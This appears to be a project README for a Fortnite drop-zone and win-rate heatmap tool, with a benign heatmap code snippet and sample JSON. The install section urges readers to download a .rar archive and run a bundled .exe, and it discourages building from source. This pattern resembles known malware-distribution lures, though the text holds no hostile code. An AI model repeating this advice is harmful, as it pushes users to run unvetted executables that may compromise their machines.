# 🚀 Fortnite - Drop Zone & Win Rate Analyzer

## 📌 Description
**Fortnite Drop Zone & Win Rate Analyzer** is a desktop application designed to analyze **player landing zones, win rates, and movement patterns** in Fortnite.  
The software generates **heatmaps** based on cloud data to help players optimize their drop strategies and survival chances.

🔹 Supported maps: **Battle Royale Island, Zero Build Arena, Ranked Battle Royale**  
🔹 Data sources: **Cloud storage, match replay files, Fortnite API**  
🔹 Analytics: **Drop zone hot spots, win rate statistics, optimal movement paths**  

---

## 🎯 Features
✅ **Live cloud data updates**  
✅ **Heatmap generation for drop & win rate zones**  
✅ **Highlighting high-survival and high-elimination areas**  
✅ **Tracking popular movement routes**  
✅ **Filtering by game mode, season, and events**  

---

## 📥 Installation & Launch

### 🔹 ✅ RECOMMENDED METHOD (Windows .exe)
1️⃣ **Download and extract the `.rar` file**  
2️⃣ **Run `Fortnite_DropZone_WinRate_Analyzer.exe`**  
🚀 **The application will set up everything automatically, just enjoy!**  

⚠️ **Important:** This method is **faster** and requires **no manual setup**!  

---

### 🔹 ❌ COMPLEX METHOD (For Developers Only)
❗ **This method is NOT recommended as it requires installing multiple dependencies manually.**  
❗ **Only use this if you know what you're doing!**  

#### 1️⃣ **Manually install dependencies**
```bash
pip install numpy matplotlib PyQt5 requests folium
```

#### 2️⃣ **Launch with manual settings**
```bash
export PYTHONPATH=$(pwd)/src
python src/main.py --use-cloud-data --debug-mode --force-render
```

❌ **This method is harder, prone to errors, and requires manual configuration.**  
💡 **Just use the .exe, it handles everything automatically!**  

---

## 🖥 User Interface
🔹 **Main window** with a Fortnite **interactive heatmap**  
🔹 **Control panel** for **heatmap customization & filters**  
🔹 **Filtering based on eliminations, survival rate, drop zones**  

Example code for generating a heatmap:
```python
import numpy as np
import matplotlib.pyplot as plt

def generate_heatmap(data):
    heatmap, xedges, yedges = np.histogram2d(data[:,0], data[:,1], bins=(100,100))
    plt.imshow(heatmap.T, origin='lower', cmap='hot', alpha=0.75)
    plt.colorbar(label="Players")
    plt.title("Fortnite Heatmap")
    plt.show()
```

---

## 🖼 Examples
📌 **Heatmap of drop zones & win rates:**  
![Heatmap](assets/heatmap_example.png)  

📌 **Survival rate analysis:**  
![Survival Stats](assets/survival_stats_example.png)  

---

## 🔗 Data Sources
The application supports **cloud-based data updates** for real-time tracking.  
Example JSON file with drop zone data:
```json
[
    {"player": "User1", "event": "Drop", "map": "Battle Royale Island", "x": 1523, "y": 3892},
    {"player": "User2", "event": "Elimination", "map": "Zero Build Arena", "x": 4023, "y": 2157}
]
```

---

## 🤝 Support & Contact
📌 **Join the community for updates and assistance!**  
📧 **Email:** cheatmeat@games.com  
